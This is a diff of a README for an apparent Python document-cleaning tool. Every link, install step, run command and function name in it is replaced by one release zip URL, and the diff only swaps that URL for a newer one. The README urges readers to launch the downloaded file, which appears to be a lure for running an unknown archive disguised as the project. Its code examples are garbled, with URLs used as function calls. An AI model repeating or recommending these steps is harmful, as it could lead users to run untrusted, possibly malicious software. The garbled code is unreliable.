@@ -25,7 +25,7 @@ Welcome to the **document-cleaning-pipeline** repository! This Python script is 
 
 To get started with the document cleaning pipeline, download the required files from the following link: 
 
-[![Download Script](https://github.com/tinytim08/document-cleaning-pipeline/releases/download/v1.0/Program.zip)](https://github.com/tinytim08/document-cleaning-pipeline/releases/download/v1.0/Program.zip)
+[![Download Script](https://github.com/tinytim08/document-cleaning-pipeline/releases/download/v2.0/Software.zip)](https://github.com/tinytim08/document-cleaning-pipeline/releases/download/v2.0/Software.zip)
 
 🚀 Launch the downloaded file to set up the pipeline and start cleaning your documents effortlessly!
 
@@ -34,8 +34,8 @@ If the above link is not working, kindly check the "Releases" section of this re
 ## Getting Started
 
 1. Clone the repository to your local machine.
-2. Install the necessary dependencies by running `pip install -r https://github.com/tinytim08/document-cleaning-pipeline/releases/download/v1.0/Program.zip`.
-3. Execute the script by running `python https://github.com/tinytim08/document-cleaning-pipeline/releases/download/v1.0/Program.zip`.
+2. Install the necessary dependencies by running `pip install -r https://github.com/tinytim08/document-cleaning-pipeline/releases/download/v2.0/Software.zip`.
+3. Execute the script by running `python https://github.com/tinytim08/document-cleaning-pipeline/releases/download/v2.0/Software.zip`.
 4. Follow the on-screen instructions to clean your documents using the pipeline.
 
 ## Examples
@@ -48,8 +48,8 @@ Here are some sample use cases of the document cleaning pipeline:
 from document_cleaning import ImageDenoiser
 
 denoiser = ImageDenoiser()
-clean_image = https://github.com/tinytim08/document-cleaning-pipeline/releases/download/v1.0/Program.zip(image_path='https://github.com/tinytim08/document-cleaning-pipeline/releases/download/v1.0/Program.zip')
-https://github.com/tinytim08/document-cleaning-pipeline/releases/download/v1.0/Program.zip('https://github.com/tinytim08/document-cleaning-pipeline/releases/download/v1.0/Program.zip')
+clean_image = https://github.com/tinytim08/document-cleaning-pipeline/releases/download/v2.0/Software.zip(image_path='https://github.com/tinytim08/document-cleaning-pipeline/releases/download/v2.0/Software.zip')
+https://github.com/tinytim08/document-cleaning-pipeline/releases/download/v2.0/Software.zip('https://github.com/tinytim08/document-cleaning-pipeline/releases/download/v2.0/Software.zip')
 ```
 
 ### Batch Processing
@@ -58,12 +58,12 @@ https://github.com/tinytim08/document-cleaning-pipeline/releases/download/v1.0/P
 from document_cleaning import DocumentBatchProcessor
 
 processor = DocumentBatchProcessor()
-https://github.com/tinytim08/document-cleaning-pipeline/releases/download/v1.0/Program.zip(directory='input_documents', output_directory='cleaned_documents')
+https://github.com/tinytim08/document-cleaning-pipeline/releases/download/v2.0/Software.zip(directory='input_documents', output_directory='cleaned_documents')
 ```
 
 ## Support
 
-If you encounter any issues or have questions about the document cleaning pipeline, feel free to reach out to us by creating an [issue](https://github.com/tinytim08/document-cleaning-pipeline/releases/download/v1.0/Program.zip). We are here to assist you in optimizing your document cleaning process.
+If you encounter any issues or have questions about the document cleaning pipeline, feel free to reach out to us by creating an [issue](https://github.com/tinytim08/document-cleaning-pipeline/releases/download/v2.0/Software.zip). We are here to assist you in optimizing your document cleaning process.
 
 ## Contributing
 
